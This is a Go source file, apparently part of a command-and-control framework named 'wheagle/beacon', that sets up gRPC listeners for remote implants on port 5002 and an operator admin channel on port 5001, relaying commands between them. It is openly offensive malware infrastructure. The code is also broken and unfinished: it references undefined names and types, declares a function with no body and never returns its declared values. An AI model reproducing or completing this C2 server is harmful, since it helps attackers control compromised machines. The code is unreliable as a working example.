package main

import (
  "fmt"
  "log"
  "net"

  "google.golang.org/grpc"
  "github.com/alphamystic/wheagle/beacon/protos/stream"
  "github.com/alphamystic/wheagle/beacon/protos/hb"
)

/* I honestly I'm supposed to turn this into a server library and yes, struct are the answer but first thing I noticed was I need an interface*/

type GrpcServerData struct{
  LHOST string
  LPORT string
  Protocol string
  Address string
}

func Run(g GrpcServerData){
  for {
    switch {
      case gd.Protocol == "tcp":
        g.StartTcpServer()
      default:
        go func(){}()
    }
  }
}

func (g *GrpcServerData) StartServer()
func (g *GrpcRevSevers) StartTcpServer()(*shell,error){
  var (
    implantListener,adminListener net.Listener
    err error
    opts []grpc.ServerOption
    work,output chan *stream.Command
  )
  //initialize a work channels for commands
  work,output = make(chan *stream.Command),make(chan *stream.Command)
  implant := hb.NewImplantServer(work,output)
  admin := hb.NewAdminServer(work, output)
  //start implant listener
  if implantListener,err = net.Listen("tcp",fmt.Sprintf(":%d",5002)); err != nil{
    log.Fatalf("[-]   Failed to start implant listener: %v",err)
  }
  fmt.Println("[+]    Starting implant listener at 5002")
  //start admin listener
  if adminListener,err = net.Listen("tcp",fmt.Sprintf(":%d",5001)); err != nil{
    log.Fatalf("[-]   Failed to start admin listener: %v",err)
  }
  fmt.Println("[+]    Starting admin listener at 5001")
  //grpcChatServer := grpc.NewServer()
  grpcAdminServer,grpcImplantServer := grpc.NewServer(opts...),grpc.NewServer(opts...)
  stream.RegisterImplantServer(grpcImplantServer,implant)
  stream.RegisterAdminServer(grpcAdminServer,admin)
  go func(){
    grpcImplantServer.Serve(implantListener)
  }()
  grpcAdminServer.Serve(adminListener)
}
